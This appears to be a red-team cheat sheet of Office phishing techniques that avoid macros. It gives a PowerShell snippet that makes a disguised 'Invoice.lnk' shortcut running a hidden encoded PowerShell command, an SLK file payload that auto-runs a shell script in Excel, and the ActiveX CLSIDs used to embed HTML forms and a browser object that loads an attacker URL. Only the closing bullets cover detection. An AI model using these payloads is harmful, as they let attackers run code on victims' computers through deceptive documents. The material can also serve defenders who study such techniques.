# Phishing Vectors (Non-Macro)

## OLE + LNK Embedding
- Create .lnk with PowerShell target and hidden encoded command
- Embed .lnk as OLE Package object in Word doc, change icon to Word icon
```powershell
$link = (New-Object -ComObject wscript.shell).createshortcut("Invoice.lnk")
$link.targetpath = "powershell.exe"
$link.arguments = "-Nop -sta -noni -w hidden -encodedCommand <base64>"
$link.iconlocation = "C:\Program Files\Windows NT\Accessories\wordpad.exe"
$link.save()
```

## Embedded HTML Forms
- Embed HTML form ActiveX control (CLSID: 5512D112-5CC6-11CF-8D67-00AA00BDCE1D)
- Executes code when form is interacted with

## SLK Files
- Plain text file with .slk extension, auto-opens in Excel:
```
ID;P
O;E
NN;NAuto_open;ER101C1;KOut Flank;F
C;X1;Y101;K0;EEXEC("c:\shell.cmd")
C;X1;Y102;K0;EHALT()
E
```
- Can also be saved as .csv

## Embedded Internet Explorer
- Embed Shell.Explorer.1 COM object (CLSID: EAB22AC3-30C1-11CF-A7EB-0000C05BAE0B)
- Navigates to attacker-controlled URL within the document

## Detection
- Look for Office spawning suspicious child processes
- Inspect .bin files in unzipped documents for suspicious CLSIDs
